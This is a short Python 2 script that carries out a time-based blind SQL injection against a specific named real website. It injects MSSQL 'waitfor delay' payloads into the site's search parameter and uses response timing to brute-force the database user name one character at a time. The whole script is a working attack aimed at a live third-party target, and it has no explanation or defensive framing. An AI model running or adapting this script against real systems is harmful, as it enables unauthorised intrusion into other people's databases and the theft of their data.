# -*- coding:utf-8 -*-
import requests

import sys

reload(sys)

sys.setdefaultencoding('utf-8')



payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')

user = ''

print "test..."

for i in range(1,11):

    for payload in payloads:

		wait=" waitfor delay '0:0:3'--&fsh_s="
		 
		sub="';if substring(user,%s,1)='%s'" % (i, payload)

		test = sub + wait


		r = requests.get('http://www.rztong.com.cn/soso/?k=1'+test)

		if r.elapsed.seconds >= 3:

			user += payload

			print payload.strip()

			break

print user